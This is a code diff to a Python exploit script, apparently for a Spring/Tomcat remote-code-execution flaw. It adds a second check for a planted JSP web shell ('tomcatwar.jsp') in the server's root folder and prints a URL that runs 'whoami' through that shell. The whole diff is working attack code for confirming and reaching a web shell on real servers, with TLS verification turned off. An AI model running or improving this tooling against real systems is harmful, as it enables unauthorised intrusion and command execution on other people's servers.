@@ -7,7 +7,7 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-from urllib.parse import urljoin
+from urllib.parse import urljoin,urlparse
 from threading import Thread
 from sys import exit
 
@@ -45,9 +45,22 @@ class Exploit(Thread):
                                    verify=False)
             if shellgo.status_code == 200:
                 print(f"Vulnerable，shell ip:{shellurl}?pwd=j&cmd=whoami")
+
+            ## Depending on the server, the shell url may be in tomcats root folder
             else:
-                print(f"\033[91m[" + '\u2718' + "]\033[0m", self.url,
-                      "\033[91mNot Vulnerable!\033[0m ")
+                parsedurl = urlparse(shellurl)
+                rooturl = parsedurl.scheme+"://"+parsedurl.netloc # There is 100% a better way to do this, please make a PR if you know!
+                shellurlroot = urljoin(rooturl, 'tomcatwar.jsp')
+                shellgoroot = requests.get(shellurlroot,
+                                   timeout=15,
+                                   allow_redirects=False,
+                                   stream=True,
+                                   verify=False)
+                if shellgoroot.status_code == 200: 
+                    print(f"Vulnerable，shell ip:{shellurlroot}?pwd=j&cmd=whoami")
+                else:
+                    print(f"\033[91m[" + '\u2718' + "]\033[0m", self.url,
+                        "\033[91mNot Vulnerable!\033[0m ")
 
         except Exception as e:
             print(e)
